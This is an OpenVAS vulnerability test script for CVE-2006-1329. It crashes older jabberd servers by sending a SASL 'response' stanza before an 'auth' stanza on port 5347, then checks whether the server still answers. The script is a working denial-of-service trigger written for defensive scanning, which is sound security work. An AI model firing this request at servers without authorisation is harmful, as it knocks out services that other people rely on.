###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_jabberd_sasl_negotiation_dos_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Jabber Studio Jabberd Server SASL Negotiation Denial of Service Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to cause the application
  to crash, creating a denial-of-service condition.
  Impact Level: Application";
tag_affected = "Jabber Studio jabberd Server version before 2.0s11";
tag_insight = "The flaw is caused  due to an error within the handling of SASL negotiation.
  This can be exploited to cause a crash by sending a 'response' stanza before
  an 'auth' stanza.";
tag_solution = "Upgrade to Jabber Studio jabberd Server version 2.0s11 or later,
  For updates refer to http://jabberd.org/";
tag_summary = "This host is running Jabberd server and is prone to denial
  of service vulnerability.";

if(description)
{
  script_id(802825);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2006-1329");
  script_bugtraq_id(17155);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-04-02 13:27:16 +0530 (Mon, 02 Apr 2012)");
  script_name("Jabber Studio Jabberd Server SASL Negotiation Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/19281");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/25334");
  script_xref(name : "URL" , value : "http://article.gmane.org/gmane.network.jabber.admin/27372");

  script_description(desc);
  script_summary("Check if jabberd server is vulnerable to denial of service");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_require_ports("Services/www", 5347);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("version_func.inc");
include("http_func.inc");

## Variable Initialization
resp = "";
req1 = "";
req2 = "";
soc  = "";
soc2 = "";
jbPort = 0;

## jabberd Server Port
jbPort = 5347;

## Check Port Status
if(!get_port_state(jbPort)){
  exit(0);
}

# Establish a TCP connection.
soc = open_sock_tcp(jbPort);
if (!soc){
  exit(0);
}

# Construct a Jabberd request
req1 = string('<?xml version="1.0"?>\n',
              '<stream:stream to="xyz.com"\n',
              'xmlns="jabber:client"\n',
              'xmlns:stream="http://etherx.jabber.org/streams"\n',
              'xml:lang="en" version="1.0">\n');

send(socket:soc, data:req1);
resp = recv(socket:soc, length:1024);

# Confirm application and check if it supports SASL
if(resp && "jabber.org" >< resp && "xmpp-sasl" >< resp)
{
  ## Construct an attack request
  ## A SASL'response' req
  req2 = "<response xmlns='urn:ietf:params:xml:ns:xmpp-sasl'> **** </response>";

  ## Send the rquest
  send(socket:soc, data:req2);
  resp = recv(socket:soc, length:1024);
}
close(soc);

## Open the socket and
## Check server is dead or alive
soc2 = open_sock_tcp(jbPort);
if(!soc2)
{
  security_warning(jbPort);
  exit(0);
}
close(soc2);
